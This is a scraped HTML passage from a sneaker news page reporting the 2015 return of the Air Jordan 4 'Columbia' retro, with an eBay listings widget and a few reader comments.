                                            if (dropdown_brand.options[dropdown_brand.selectedIndex].value != 'brand') {
                                                location.href = site_url + dropdown_brand.options[dropdown_brand.selectedIndex].value;
                                            }
                                        }
                                        dropdown_brand.onchange = onBrandChange;
                                    </script>
                                </li>
                                <li><a href="/tag/lebron-12/">LeBron 12</a></li>
                                <li><a href="/tag/air-jordan-xx9/">Air Jordan XX9</a></li>
                                <li><a href="/tag/nike-kd-7/">kd 7</a></li>
                                <li><a href="/tag/nike-roshe-run/">Roshe Run</a></li>
                                <li><a href="/category/air-jordan/">Jordans</a></li>
                                <li><a href="/tag/kobe-9/">Kobe 9</a></li>
                                <li><a href="/category/adidas/">Adidas</a></li>
                                <li><a href="/category/just-released/">Just Released</a></li>
                                <li><a href="/category/upcoming-sneakers/">Upcoming</a></li>
                            </ul>
                        </li>
                        <li><a href="/air-jordan-brand-jordan/">air jordan history</a></li>
                        <li><a href="/nike-sb-skateboarding/">nike sb archive</a></li>
                    </ul>	
                </div>
            </header> 
            <!--header-->
						<!-- open cmn_wrap -->
			<div id="cmn_wrap">
<div id="detail-page-container">
    <div class="wrapper">
        <div class="detail-con-main">
            <div class="left-main">
                
                    <script type="text/javascript" async src="//assets.pinterest.com/js/pinit.js"></script>
<div class="product-detail-main">
    <h1>Air Jordan 4 &#8220;Columbia&#8221; Retro Returning in 2015</h1>
    <div class="date-and-name">
        <p><span>June 4, 2014 BY <a class="url fn n" href="http://sneakernews.com/author/johnkimx83/" title="View all posts by John Kim" rel="author">John Kim</a>  /</span> 
		<b class="comment">
			96		</b>
				</p>
    </div>

    <div class="vote-box"><div id="post-ratings-517971" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="289fff8a9f"><span class="default-rating-digit"><span class="show-rating-digit default-rating-digit">3.39 </span> /  5 <i>(9 VOTES)</i></span><div class="vote-icon"><span class="rating-img"> <i><b><span class="post-ratings-text" id="ratings_517971_text"></span></b></i>  <img id="rating_517971_1" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on_left.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(517971, 1, 'RATE THIS SHOE');" onmouseout="ratings_off(6.78, 7, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_517971_2" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(517971, 2, 'RATE THIS SHOE');" onmouseout="ratings_off(6.78, 7, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_517971_3" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on_left.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(517971, 3, 'RATE THIS SHOE');" onmouseout="ratings_off(6.78, 7, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_517971_4" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(517971, 4, 'RATE THIS SHOE');" onmouseout="ratings_off(6.78, 7, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_517971_5" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on_left.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(517971, 5, 'RATE THIS SHOE');" onmouseout="ratings_off(6.78, 7, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_517971_6" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(517971, 6, 'RATE THIS SHOE');" onmouseout="ratings_off(6.78, 7, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_517971_7" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_on_left.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(517971, 7, 'RATE THIS SHOE');" onmouseout="ratings_off(6.78, 7, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_517971_8" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_off_right.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(517971, 8, 'RATE THIS SHOE');" onmouseout="ratings_off(6.78, 7, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_517971_9" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_off.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(517971, 9, 'RATE THIS SHOE');" onmouseout="ratings_off(6.78, 7, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /><img id="rating_517971_10" src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/stars/rating_off_right.png" alt="RATE THIS SHOE" title="RATE THIS SHOE" onmouseover="current_rating(517971, 10, 'RATE THIS SHOE');" onmouseout="ratings_off(6.78, 7, 0);" onclick="rate_post();" onkeypress="rate_post();" style="cursor: pointer; border: 0px;" /></span> </div><meta itemprop="name" content="Air Jordan 4 &#8220;Columbia&#8221; Retro Returning in 2015" /><meta itemprop="description" content="

Earlier today, we gave you info regarding the return of the Air Jordan 4 &quot;Oreo&quot; for 2015. Turns out, another 1999 Retro release is coming back as well - the &quot;Columbia&quot; colorway seen here. If you'r..." /><meta itemprop="url" content="http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/" /><div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating"><meta itemprop="bestRating" content="10" /><meta itemprop="ratingValue" content="6.78" /><meta itemprop="ratingCount" content="9" /></div></div><div id="post-ratings-517971-loading" class="post-ratings-loading">
			<img src="http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/images/loading.gif" width="16" height="16" alt="Loading..." title="Loading..." class="post-ratings-image" />Loading...</div></div>	
    <div class="social-shares">
        <div class="soc-icon">
            <div class="facebook social_box">
                <div class="like_box">
                    <div class="fb-like" data-href="http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                </div>
            </div>
            <!--twitter-->
            <div class="twitter social_box">
                <div class="like_box">
                    <a href="https://twitter.com/share" class="twitter-share-button external" data-count="horizontal" data-url="http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/" data-text="Air Jordan 4 &#8220;Columbia&#8221; Retro Returning in 2015" data-via="sneakernews" target="_blank">Tweet</a>					
                </div>
            </div>
            <!--twitter-->
            <div class="google social_box">
                <div class="like_box">
                    <div class="g-plusone" data-callback="googlePlusCallback" data-size="medium" data-href="http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/"></div>
                </div>	
            </div>
            <div class="pinterest social_box">
                <div class="like_box">
                    <a href="//www.pinterest.com/pin/create/button/?url=http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/" data-pin-do="buttonPin" data-pin-zero="true" data-pin-config="beside" class="external" target="_blank"><img src="//assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png" /></a>
                </div>	
            </div>
        </div>
        <div class="shares-like">
            <strong>1645</strong> <span>shares / likes</span>
        </div>
    </div>
    <div class="product-data">
        <p><img alt="" src="http://cdn.sneakernews.com/wp-content/uploads/2014/06/jordan-4-columbia-retro.jpg" /></p>
<p>Earlier today, we gave you info regarding the return of the <a href="http://sneakernews.com/2014/06/04/air-jordan-4-oreo-releasing-2015/">Air Jordan 4 &#8220;Oreo&#8221; for 2015</a>. Turns out, another 1999 Retro release is coming back as well &#8211; the &#8220;Columbia&#8221; colorway seen here. If you&#8217;re not too familiar with the 1999 Retro pictured here, Jordan Brand released its first new Retro colorways in history with the <a href="http://sneakernews.com/tag/air-jordan-iv/">Air Jordan IV</a> by presenting brand new concepts (note the perforated leather upper in place of the netting). A release date hasn&#8217;t been set, but we&#8217;ll have that information for you as soon as it surfaces. Your thoughts on this return? Let us know in the comments below.</p>
<p><span id="more-517971"></span></p>
<p>Source: <a href="http://instagram.com/oregonsole" class="external" target="_blank">oregonsole</a></p>
<p>Photos: <a href="http://www.kixclusive.com/" class="external" target="_blank">kixclusive</a>/<a href="http://instagram.com/ogkream" class="external" target="_blank">ogkream</a><br />
<img class="alignnone size-full wp-image-517973" alt="" src="http://cdn.sneakernews.com/wp-content/uploads/2014/06/air-jordan-4-retro-columbia-2015.jpg" /></p>
<p><em>Note: Both photos of the Air Jordan IV are the 1999 Retro.</em></p>
<div id="ebay-embed">

<style type="text/css">
#ebay-embed * {vertical-align:middle}
#ebay-embed table  {margin:0 auto !important;padding:0 !important; clear: both;}
#ebay-embed table:nth-child(2) {}
#ebay-embed table img {border:0 !important}
#ebay-embed table tr td {margin:0 !important;padding:0 !important;vertical-align:middle}
#ebay-embed table tr td[colspan="3"],
#ebay-embed table tr td[colspan="5"] {line-height:0 !important}
#ebay-embed table tr td a img {height:auto;margin:0 !important;padding:0 !important;display:inline-block;}
#ebay-embed table tr td img {height:1px;margin:0 !important;padding:0 !important;display:inline-block;}
#ebay-embed table tr  {margin:0 !important;padding:0 !important;}
#ebay-embed table tr td table tr td[align="right"] br {display:none !important}
#ebay-embed table tr td table tr td[align="right"] form {float:left !important}
#ebay-embed table tr td table tr td[align="right"] form input[type="text"] {float:left !important;width:240px;margin:0 5px 0 0 !important;padding:9px !important}
#ebay-embed table tr td table tr td[align="right"] form img {display:none !important}
#ebay-embed table tr td table tr td[align="right"] form input[type="submit"] {float:left !important}
</style>
</div> <div class="ebay-box-mian">
	                        		<div class="ebay-header">
	                            		<a style="color:#3981db" target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?campid=5335897303&#038;customid=SND+Air+Jordan+IV+Military+Blue&#038;toolid=10004&#038;mpre=http://pages.ebay.com/" class="external">
											<img border="0" src="http://cdn.sneakernews.com/wp-content/plugins/post-snippets/src/PostSnippets/img/ebay.jpg " alt=" eBay Marketplace Logo ">
										</a>
	                            	</div>
	                            	<div class="ebay-producr-data">
	                            		<ul class="ebay-producr-data-top">
	                                		<li class="disclaimer">
	                                			<a target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?campid=5335897303&#038;customid=SSND+Air+Jordan+IV+Military+Blue&#038;toolid=10004&#038;mpre=http%3A//pages.ebay.com/help/community/editorkitlegal.html" class="external">
													<i>disclaimer</i>
												</a>                                			
	                                		</li>
	                                    	<li class="search-box">                                    		
	                                        	<form action="http://www.ebay.com/sch/items/Air Jordan IV Military Blue" name="EditorKitSearch" method="post" class=" nomargin">
													<input type="text" value="Air Jordan IV Military Blue" name="satitle" size="12">												
													<input type="submit" class="submit-ebay" value="Search" name="search">
												</form>
	                                    	</li>                                    	
	                                    	<li class="all-items">
	                                    		<a target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?ff3=4&#038;toolid=10041&#038;campid=5335897303&#038;customid=SND+Air+Jordan+IV+Military+Blue&#038;lgeo=1&#038;mpre=http%3A%2F%2Fwww.ebay.com%2Fsch%2Fi.html%3F_nkw%3DAir%2BJordan%2BIV%2BMilitary%2BBlue%26_ddo%3D1%26_ipg%3D30%26_pgn%3D1%26_sop%3D1" class="external">View all 141 items on eBay</a>
	                                    	</li>    
	                                	</ul>  
		                                <ul class="producr-list"><li ><img src="http://thumbs4.ebaystatic.com/m/mcTC2WKRCKAg_L7To1iDI6A/140.jpg" alt="ebay Producr" />
		        		        	<span>$167<sup>.99<sup></span>
		                		<a target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?ff3=2&#038;toolid=10041&#038;campid=5335897303&#038;customid=SND+Air+Jordan+IV+Military+Blue&#038;lgeo=1&#038;vectorid=229466&#038;item=400436859027&#038;campid=5335897303" class="external"><span><b class='bye-it-now'>Buy it Now</b><strong>0<sup>day</sup>0<sup>hr</sup>21<sup>mins</sup> left</strong></span></a>
		                	</li><li ><img src="http://thumbs2.ebaystatic.com/m/mwd3FXoE_gIwwvWi_DkYi_g/140.jpg" alt="ebay Producr" />
		        		        	<span>$60<sup>.00<sup></span>
		                		<a target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?ff3=2&#038;toolid=10041&#038;campid=5335897303&#038;customid=SND+Air+Jordan+IV+Military+Blue&#038;lgeo=1&#038;vectorid=229466&#038;item=251774877489&#038;campid=5335897303" class="external"><span><b class='bye-it-now'>Buy it Now</b><strong>0<sup>day</sup>7<sup>hr</sup>23<sup>mins</sup> left</strong></span></a>
		                	</li><li ><img src="http://thumbs3.ebaystatic.com/m/mbTN596T27Sqr_WncWooe4g/140.jpg" alt="ebay Producr" />
		        		        	<span>$100<sup>.00<sup></span>
		                		<a target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?ff3=2&#038;toolid=10041&#038;campid=5335897303&#038;customid=SND+Air+Jordan+IV+Military+Blue&#038;lgeo=1&#038;vectorid=229466&#038;item=251774886350&#038;campid=5335897303" class="external"><span>1 bids<strong>0<sup>day</sup>7<sup>hr</sup>32<sup>mins</sup> left</strong></span></a>
		                	</li><li class=last><img src="http://thumbs1.ebaystatic.com/m/m98UAd_utT_V432etFkOXdA/140.jpg" alt="ebay Producr" />
		        		        	<span>$281<sup>.09<sup></span>
		                		<a target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?ff3=2&#038;toolid=10041&#038;campid=5335897303&#038;customid=SND+Air+Jordan+IV+Military+Blue&#038;lgeo=1&#038;vectorid=229466&#038;item=271727324236&#038;campid=5335897303" class="external"><span>0 bids<strong>0<sup>day</sup>10<sup>hr</sup>47<sup>mins</sup> left</strong></span></a>
		                	</li><li ><img src="http://thumbs4.ebaystatic.com/m/mj6tYjtmUmEkAHqKwDzM71w/140.jpg" alt="ebay Producr" />
		        		        	<span>$349<sup>.89<sup></span>
		                		<a target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?ff3=2&#038;toolid=10041&#038;campid=5335897303&#038;customid=SND+Air+Jordan+IV+Military+Blue&#038;lgeo=1&#038;vectorid=229466&#038;item=271727324463&#038;campid=5335897303" class="external"><span>0 bids<strong>0<sup>day</sup>10<sup>hr</sup>47<sup>mins</sup> left</strong></span></a>
		                	</li><li ><img src="http://thumbs3.ebaystatic.com/m/mKFGtzqxAeX-YhBW6fdotvQ/140.jpg" alt="ebay Producr" />
		        		        	<span>$192<sup>.46<sup></span>
		                		<a target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?ff3=2&#038;toolid=10041&#038;campid=5335897303&#038;customid=SND+Air+Jordan+IV+Military+Blue&#038;lgeo=1&#038;vectorid=229466&#038;item=271727325642&#038;campid=5335897303" class="external"><span>0 bids<strong>0<sup>day</sup>10<sup>hr</sup>48<sup>mins</sup> left</strong></span></a>
		                	</li><li ><img src="http://thumbs1.ebaystatic.com/m/mmYvoFlYxQ5N0sXozOkUyRQ/140.jpg" alt="ebay Producr" />
		        		        	<span>$262<sup>.35<sup></span>
		                		<a target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?ff3=2&#038;toolid=10041&#038;campid=5335897303&#038;customid=SND+Air+Jordan+IV+Military+Blue&#038;lgeo=1&#038;vectorid=229466&#038;item=301467944624&#038;campid=5335897303" class="external"><span>0 bids<strong>0<sup>day</sup>10<sup>hr</sup>48<sup>mins</sup> left</strong></span></a>
		                	</li><li class=last><img src="http://thumbs4.ebaystatic.com/m/muextjhVP3pUTTz-p0AQnlw/140.jpg" alt="ebay Producr" />
		        		        	<span>$331<sup>.91<sup></span>
		                		<a target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?ff3=2&#038;toolid=10041&#038;campid=5335897303&#038;customid=SND+Air+Jordan+IV+Military+Blue&#038;lgeo=1&#038;vectorid=229466&#038;item=301467945119&#038;campid=5335897303" class="external"><span>0 bids<strong>0<sup>day</sup>10<sup>hr</sup>49<sup>mins</sup> left</strong></span></a>
		                	</li> </ul></div>
	                       </div>

        <p class="tag-product"><i>Filed under:</i> <a href="http://sneakernews.com/category/air-jordan/" rel="category tag">Air Jordan</a> <a href="http://sneakernews.com/category/upcoming-sneakers/" rel="category tag">Upcoming Sneakers</a> </p> <p class="tag-product"><i>Tags:</i> <a href="http://sneakernews.com/tag/air-jordan-iv/" rel="tag">Air Jordan (4) IV</a> <a href="http://sneakernews.com/tag/air-jordan-4/" rel="tag">Air Jordan 4</a> <a href="http://sneakernews.com/tag/air-jordan-4-columbia/" rel="tag">Air Jordan 4 Columbia</a> <a href="http://sneakernews.com/tag/air-jordan-iv-columbia/" rel="tag">Air Jordan IV Columbia</a> </p>                <!--<div class="navigation">
                        </div>-->
    </div>
</div>	
                    <div class="prev-next">
                        <a class="back-to-list" href="http://sneakernews.com">back to list</a>

                        <div class="prev-btn"> <a href="http://sneakernews.com/2014/06/04/look-back-one-limited-air-jordan-retro-releases-history/" rel="next"><em>newer post</em><span>A Look Back At One Of The...</a></span></div>                        <div class="next-btn"><a href="http://sneakernews.com/2014/06/04/history-of-luxury-sneaker-copycats/" rel="prev"><em>older post</em><span>A History of Luxury Sneaker...</a></span></div>                    </div>
                    <div id="livefyre-comments"><script>
  (function() {
    
   var a=this;var b,c,d,e,f;function g(){return a.navigator?a.navigator.userAgent:null}f=e=d=c=b=!1;var h;if(h=g()){var i=a.navigator;b=0==h.indexOf("Opera");c=!b&&-1!=h.indexOf("MSIE");e=(d=!b&&-1!=h.indexOf("WebKit"))&&-1!=h.indexOf("Mobile");f=!b&&!d&&"Gecko"==i.product}var j=c,k=f,l=d,m=e;var n;if(b&&a.opera){var o=a.opera.version;"function"==typeof o&&o()}else k?n=/rv\:([^\);]+)(\)|;)/:j?n=/MSIE\s+([^\);]+)(\)|;)/:l&&(n=/WebKit\/(\S+)/),n&&n.exec(g());var p=document,q=p.createElement("link");q.rel="stylesheet";q.type="text/css";q.href="http://zor.fyre.co/wjs/v3.0/css/livefyre_"+(m?"mobile":"embed")+".css";q.media="all";p.getElementsByTagName("head")[0].appendChild(q);var r="header hgroup footer article section aside nav figure figcaption embed audio video canvas details summary time mark".split(" "),s=p.createDocumentFragment(),t;for(t=0; t<r.length; t++){s.appendChild(p.createElement(r[t]))};
   })();    
</script>
<div class="fyre fyre-width-large fyre-bootstrap">
  <div class="fyre-widget">
    <div class="fyre-stream-stats">
      <div class="fyre-comment-count">
        <span>95 comments</span>
      </div>

      <div class="fyre-divider"></div>

      <div class="fyre-help">
        <div class="fyre-box-wrapper">
          <a href="http://livefyre.com" target="_blank" class="external"><span class="fyre-logo-drop">&nbsp</span>
          <img class="fyre-logo-help" src="http://zor.fyre.co/wjs/v3.0/images/lf-logo.png" alt="Livefyre" /></a>
          
          <ul class="fyre-box-list">
            <li><a href="http://livefyre.com" target="_blank" title="Get Livefyre" class="external">Get
            Livefyre</a></li>

            <li><a href="http://support.livefyre.com" target="_blank" title="FAQ" class="external">FAQ</a></li>
          </ul>
        </div>
      </div>
    </div>

    <div class="fyre-auth">
      <div class="fyre-login-bar"><a rel="nofollow" href="#" class="fyre-user-loggedout">Sign in</a></div>
    </div>

    <div class="fyre-editor">
      <div class="fyre-editor-container">
        <div class="fyre-editor-editable" style="height: 100px;"></div>

        <div class="fyre-editor-toolbar">
          <div class="goog-toolbar goog-toolbar-horizontal" style=
          "-webkit-user-select: none;" role="toolbar" aria-activedescendant="">
            <div class="goog-inline-block fyre-button-left fyre-format-button" title=""
            role="button" style="-webkit-user-select: none;" id=":0">
              <div class="goog-inline-block fyre-button-left-outer-box" style=
              "-webkit-user-select: none;">
                <div class="goog-inline-block fyre-button-left-inner-box" style=
                "-webkit-user-select: none;"></div>
              </div>
            </div>

            <div class="goog-inline-block fyre-button-left fyre-mention-button" title=""
            role="button" style="-webkit-user-select: none;" id=":1">
              <div class="goog-inline-block fyre-button-left-outer-box" style=
              "-webkit-user-select: none;">
                <div class="goog-inline-block fyre-button-left-inner-box" style=
                "-webkit-user-select: none;"></div>
              </div>
            </div>

            <div class="goog-inline-block fyre-button-left fyre-follow-button" title=""
            role="button" style="-webkit-user-select: none;" id=":2">
              <div class="goog-inline-block fyre-button-left-outer-box" style=
              "-webkit-user-select: none;">
                <div class="goog-inline-block fyre-button-left-inner-box" style=
                "-webkit-user-select: none;">
                  + Follow
                </div>
              </div>
            </div>

            <div class=
            "goog-inline-block fyre-button-right fyre-post-button fyre-post-button-enabled"
            title="" role="button" style="-webkit-user-select: none;" id=":3">
              <div class="goog-inline-block fyre-button-right-outer-box" style=
              "-webkit-user-select: none;">
                <div class="goog-inline-block fyre-button-right-inner-box" style=
                "-webkit-user-select: none;">
                  Post comment
                </div>
              </div>
            </div>

            <div class=
            "goog-inline-block fyre-button-right fyre-post-to fyre-post-to-facebook"
            title="" role="button" style="-webkit-user-select: none;" id=":4">
              <div class="goog-inline-block fyre-button-right-outer-box" style=
              "-webkit-user-select: none;">
                <div class="goog-inline-block fyre-button-right-inner-box" style=
                "-webkit-user-select: none;"></div>
              </div>
            </div>

            <div class=
            "goog-inline-block fyre-button-right fyre-post-to fyre-post-to-twitter"
            title="" role="button" style="-webkit-user-select: none;" id=":5">
              <div class="goog-inline-block fyre-button-right-outer-box" style=
              "-webkit-user-select: none;">
                <div class="goog-inline-block fyre-button-right-inner-box" style=
                "-webkit-user-select: none;"></div>
              </div>
            </div>

            <div class=
            "goog-inline-block fyre-button-right fyre-post-to fyre-post-to-linkedin"
            title="" role="button" style="-webkit-user-select: none;" id=":7">
              <div class="goog-inline-block fyre-button-right-outer-box" style=
              "-webkit-user-select: none;">
                <div class="goog-inline-block fyre-button-right-inner-box" style=
                "-webkit-user-select: none;"></div>
              </div>
            </div>

            <div class="goog-toolbar-separator goog-inline-block" style=
            "-webkit-user-select: none;" role="separator" id=":6">
              &nbsp;
            </div>
          </div>

          <div class="fyre-format-toolbar" style="display: none;">
            <div class="goog-toolbar goog-toolbar-horizontal" style=
            "-webkit-user-select: none;" role="toolbar" tabindex="-1">
              <div class="goog-inline-block goog-toolbar-button" title="Bold"
              aria-pressed="true" role="button" style="-webkit-user-select: none;" id=
              "+bold">
                <div class="goog-inline-block goog-toolbar-button-outer-box" style=
                "-webkit-user-select: none;">
                  <div class="goog-inline-block goog-toolbar-button-inner-box" style=
                  "-webkit-user-select: none;">
                    <div class="tr-icon tr-bold" style="-webkit-user-select: none;">
                    </div>
                  </div>
                </div>
              </div>

              <div class="goog-inline-block goog-toolbar-button" title="Italic"
              aria-pressed="true" role="button" style="-webkit-user-select: none;" id=
              "+italic">
                <div class="goog-inline-block goog-toolbar-button-outer-box" style=
                "-webkit-user-select: none;">
                  <div class="goog-inline-block goog-toolbar-button-inner-box" style=
                  "-webkit-user-select: none;">
                    <div class="tr-icon tr-italic" style="-webkit-user-select: none;">
                    </div>
                  </div>
                </div>
              </div>

              <div class="goog-inline-block goog-toolbar-button" title="Underline"
              aria-pressed="true" role="button" style="-webkit-user-select: none;" id=
              "+underline">
                <div class="goog-inline-block goog-toolbar-button-outer-box" style=
                "-webkit-user-select: none;">
                  <div class="goog-inline-block goog-toolbar-button-inner-box" style=
                  "-webkit-user-select: none;">
                    <div class="tr-icon tr-underline" style="-webkit-user-select: none;">
                    </div>
                  </div>
                </div>
              </div>

              <div class="goog-inline-block goog-toolbar-button" title=
              "Add or remove link" aria-pressed="true" role="button" style=
              "-webkit-user-select: none;" id="+link">
                <div class="goog-inline-block goog-toolbar-button-outer-box" style=
                "-webkit-user-select: none;">
                  <div class="goog-inline-block goog-toolbar-button-inner-box" style=
                  "-webkit-user-select: none;">
                    <div class="tr-link" style="-webkit-user-select: none;">
                      Link
                    </div>
                  </div>
                </div>
              </div>

              <div class="goog-inline-block goog-toolbar-button" title="Numbered list"
              aria-pressed="true" role="button" style="-webkit-user-select: none;" id=
              "+insertOrderedList">
                <div class="goog-inline-block goog-toolbar-button-outer-box" style=
                "-webkit-user-select: none;">
                  <div class="goog-inline-block goog-toolbar-button-inner-box" style=
                  "-webkit-user-select: none;">
                    <div class="tr-icon tr-insertOrderedList" style=
                    "-webkit-user-select: none;"></div>
                  </div>
                </div>
              </div>

              <div class="goog-inline-block goog-toolbar-button" title="Bullet list"
              aria-pressed="true" role="button" style="-webkit-user-select: none;" id=
              "+insertUnorderedList">
                <div class="goog-inline-block goog-toolbar-button-outer-box" style=
                "-webkit-user-select: none;">
                  <div class="goog-inline-block goog-toolbar-button-inner-box" style=
                  "-webkit-user-select: none;">
                    <div class="tr-icon tr-insertUnorderedList" style=
                    "-webkit-user-select: none;"></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="fyre-comment-stream" style="">
      <div class="fyre-stream-sort">
        <a class="fyre-stream-sort-newest">Newest</a> | <a class="fyre-stream-sort-oldest">Oldest</a>
      </div>

      <div class="fyre-stream-content">      
        
            

        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/49c00619a46869d1c2553043b7bc1d1b/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="BlueDream" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">BlueDream</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>how do we get these shoes? do we win a raffle or are they going to be on the shelves</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            

        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/792022bd4354457c2b5e6a16252946d1/50.jpg?v=1419924061" class=
    "fyre-user-avatar" alt="CristopherPiceno" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">CristopherPiceno</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Are they going to be nike only resale?</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/25/6f674df67e509993faf0e96217b859f8/50.jpg?v=1402283163" class=
    "fyre-user-avatar" alt="SeanWestonn" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">SeanWestonn</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p>“<a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a>: These are releasing next year <a href="http://t.co/JEzw9lCtAD" target="_blank" rel="nofollow" class="external">dlvr.it/5wd3qB</a> <a href="http://t.co/3JlE1Je7Wn" target="_blank" rel="nofollow" class="external">pic.twitter.com/3JlE1Je7Wn</a>” yas yas yas</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/25/09cbab18c918fb882666cd59a5c0a6b1/50.jpg?v=1408897838" class=
    "fyre-user-avatar" alt="Watch_TV24" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Watch_TV24</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a> hope they have round laces </p>
    </div>
